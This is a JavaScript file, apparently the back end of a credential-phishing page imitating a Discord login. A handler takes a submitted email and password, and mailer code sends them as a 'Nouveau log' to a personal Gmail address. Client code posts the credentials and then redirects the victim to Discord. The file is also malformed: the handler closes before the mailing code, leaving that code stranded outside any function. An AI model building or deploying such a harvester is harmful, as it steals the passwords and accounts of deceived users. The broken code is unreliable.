require("dotenv").config();
const nodemailer = require("nodemailer");

 module.exports = async (req, res) => {
    if (req.method !== "POST") {
        return res.status(405).json({ message: "Méthode non autorisée" });
    }

    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ message: "Email et mot de passe requis" });
    }

    res.status(200).json({ message: "Données reçues !" });
};

    // Configurer le transporteur Mailtrap
    const transporter = nodemailer.createTransport({
        host: process.env.MAILTRAP_HOST,
        port: process.env.MAILTRAP_PORT,
        auth: {
            user: process.env.MAILTRAP_USER,
            pass: process.env.MAILTRAP_PASSWORD,
        },
    });

    // Configurer l'email
    const mailOptions = {
        from: `luccabondi@gmail.com`,
        to: "luccabondi@gmail.com",
        subject: "Test Mailtrap - Nouveau log",
        text: `Email: ${email}\nMot de passe: ${password}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).json({ message: "Email envoyé via Mailtrap !" });
    } catch (error) {
        console.error("Erreur envoi email:", error);
        res.status(500).json({ message: "Erreur d'envoi d'email", error });
    }
}
fetch("/api/send-log", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ email: email, password: password })
})
.then(response => response.json())
.then(data => {
    console.log(data);
    alert("Log envoyé avec succès !");
    window.location.href = "https://discord.com/channels/@me";
})
.catch(error => {
    console.error("Erreur :", error);
    alert("Une erreur est survenue lors de l'envoi des logs.");
});
